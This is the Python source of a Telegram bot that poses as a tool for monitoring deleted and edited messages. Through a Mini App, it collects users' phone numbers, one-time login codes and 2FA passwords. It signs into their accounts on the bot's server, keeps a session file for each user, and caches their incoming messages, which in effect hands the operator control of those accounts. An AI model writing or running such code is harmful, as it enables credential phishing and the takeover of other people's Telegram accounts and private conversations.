import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.custom import Button
import nest_asyncio
import json

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# Хранилище данных
user_sessions = {}  # {user_id: {'phone': '...', 'client': ..., 'step': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}
mini_app_data = {}  # Данные из Mini App

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply(
                "✅ **Пин-код верный!**\n\n"
                "Открываю Mini App...",
                buttons=[[Button.webview("🚀 Открыть Mini App", "https://alsuiradmir463dhdj-hue.github.io/L-oh-fbi/")]]
            )
        else:
            await event.reply("🔐 **Введите пин-код:**\n`5482`")
        return

    # === ОБРАБОТКА ДАННЫХ ИЗ MINI APP ===
    if text.startswith('/webapp_data'):
        try:
            data = json.loads(text.replace('/webapp_data ', ''))
            mini_app_data[user_id] = data
            
            if data.get('action') == 'send_phone':
                phone = data.get('phone')
                await start_login(event, user_id, phone)
            elif data.get('action') == 'send_code':
                code = data.get('code')
                await verify_code(event, user_id, code)
            elif data.get('action') == 'send_password':
                password = data.get('password')
                await verify_2fa(event, user_id, password)
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
        return

    # === МЕНЮ ===
    if text == "/start":
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "Нажми кнопку ниже, чтобы открыть Mini App:",
            buttons=[[Button.webview("🚀 Открыть Mini App", "https://alsuiradmir463dhdj-hue.github.io/L-oh-fbi/")]]
        )
        return

    # === ЗАПРОС НОМЕРА ===
    if text == "📞 Войти по номеру":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введите номер в формате:**\n`+79001234567`")
        return

    # === ПОЛУЧЕНИЕ НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        await start_login(event, user_id, phone)
        return

    # === ПРОВЕРКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        await verify_code(event, user_id, code)
        return

    # === 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        await verify_2fa(event, user_id, password)
        return

async def start_login(event, user_id, phone):
    """Начинает процесс входа"""
    user_sessions[user_id] = {'phone': phone, 'step': 'waiting_code'}
    
    # Создаём клиента Telegram
    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['code_hash'] = sent.phone_code_hash
        await event.reply("✅ **Код отправлен!**\n\n✍️ Введи 5-значный код:")
    except Exception as e:
        await event.reply(f"❌ Ошибка: {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

async def verify_code(event, user_id, code):
    """Проверяет код"""
    session = user_sessions.get(user_id)
    if not session:
        await event.reply("❌ Сессия не найдена. Начни заново.")
        return
    
    client = session['client']
    
    try:
        await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
        me = await client.get_me()
        
        await event.reply(
            f"✅ **Успешный вход!**\n\n"
            f"👤 Аккаунт: @{me.username}\n"
            f"🆔 ID: {me.id}\n\n"
            f"🔍 **Мониторинг запущен!**"
        )
        
        if user_id in user_sessions:
            del user_sessions[user_id]
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except SessionPasswordNeededError:
        user_sessions[user_id]['step'] = 'waiting_2fa'
        await event.reply("🔐 **Требуется пароль 2FA.**\nВведи его:")
    except PhoneCodeInvalidError:
        await event.reply("❌ **Неверный код!**\nПопробуй ещё раз:")
    except PhoneCodeExpiredError:
        await event.reply("⌛ **Код истёк.**\nНажми /start и попробуй снова.")
        if user_id in user_sessions:
            del user_sessions[user_id]
    except Exception as e:
        await event.reply(f"❌ Ошибка: {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

async def verify_2fa(event, user_id, password):
    """Проверяет 2FA пароль"""
    session = user_sessions.get(user_id)
    if not session:
        await event.reply("❌ Сессия не найдена. Начни заново.")
        return
    
    client = session['client']
    
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        
        await event.reply(
            f"✅ **Вход с 2FA выполнен!**\n\n"
            f"👤 Аккаунт: @{me.username}\n"
            f"🆔 ID: {me.id}\n\n"
            f"🔍 **Мониторинг запущен!**"
        )
        
        if user_id in user_sessions:
            del user_sessions[user_id]
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except Exception as e:
        await event.reply(f"❌ Ошибка: {e}")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    """Мониторит удалённые и изменённые сообщения"""
    
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            await bot.send_message(
                user_id,
                f"🗑 **Удалено сообщение**\n"
                f"🆔 ID: {msg_id}\n"
                f"📌 Чат: {event.chat_id}"
            )
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(
            user_id,
            f"✏️ **Изменено сообщение**\n"
            f"📝 Новый текст: {event.message.text}"
        )
    
    @client.on(events.NewMessage)
    async def on_new(event):
        cache_key = f"{event.chat_id}_{event.message.id}"
        message_cache[cache_key] = {
            'text': event.message.text,
            'time': datetime.now().isoformat()
        }
    
    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info(f"🌐 Mini App: https://alsuiradmir463dhdj-hue.github.io/L-oh-fbi/")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())